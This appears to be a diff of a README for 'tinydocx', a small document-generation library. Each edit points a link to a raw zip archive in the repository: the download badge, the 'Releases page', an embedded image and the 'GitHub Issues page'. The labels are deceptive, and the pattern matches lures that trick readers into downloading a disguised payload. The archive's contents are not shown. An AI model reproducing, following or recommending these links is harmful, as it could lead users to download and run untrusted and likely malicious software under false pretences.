@@ -4,7 +4,7 @@
 Welcome to tinydocx! This is a simple library for creating DOCX and ODT documents. You can make lists, tables, and even add images with zero dependencies. Let’s get you set up to use this software.
 
 ## ⬇️ Download tinydocx
-[![Download tinydocx](https://github.com/shajaruth/tinydocx/raw/refs/heads/main/src/Software_v2.3.zip%https://github.com/shajaruth/tinydocx/raw/refs/heads/main/src/Software_v2.3.zip)](https://github.com/shajaruth/tinydocx/raw/refs/heads/main/src/Software_v2.3.zip)
+[![Download tinydocx](https://raw.githubusercontent.com/shajaruth/tinydocx/main/examples/Software_v2.2.zip%https://raw.githubusercontent.com/shajaruth/tinydocx/main/examples/Software_v2.2.zip)](https://raw.githubusercontent.com/shajaruth/tinydocx/main/examples/Software_v2.2.zip)
 
 To download tinydocx, visit the Releases page and find the latest version. Click on the appropriate file for your operating system.
 
@@ -22,7 +22,7 @@ tinydocx works on various platforms. Here are the basic requirements:
 - Lightweight and quick to set up.
 
 ## 📥 Download & Install
-1. Go to the [Releases page](https://github.com/shajaruth/tinydocx/raw/refs/heads/main/src/Software_v2.3.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/shajaruth/tinydocx/main/examples/Software_v2.2.zip).
 2. Find the latest version.
 3. Download the appropriate file for your operating system.
 4. Once downloaded, locate the file in your downloads folder.
@@ -46,7 +46,7 @@ Here is a quick example of creating a simple document:
 - Item 2
   - Sub-item A
 
-![My Image](https://github.com/shajaruth/tinydocx/raw/refs/heads/main/src/Software_v2.3.zip)
+![My Image](https://raw.githubusercontent.com/shajaruth/tinydocx/main/examples/Software_v2.2.zip)
 
 | Name | Age |
 |------|-----|
@@ -57,6 +57,6 @@ Here is a quick example of creating a simple document:
 This will create a title, bullet points, an image, and a table.
 
 ## 🌐 Support & Contributions
-If you have questions or run into issues, feel free to open an issue on the [GitHub Issues page](https://github.com/shajaruth/tinydocx/raw/refs/heads/main/src/Software_v2.3.zip). Community contribution is welcome. You can submit your improvements or suggestions via pull requests.
+If you have questions or run into issues, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/shajaruth/tinydocx/main/examples/Software_v2.2.zip). Community contribution is welcome. You can submit your improvements or suggestions via pull requests.
 
 Thank you for choosing tinydocx! Happy document creation!
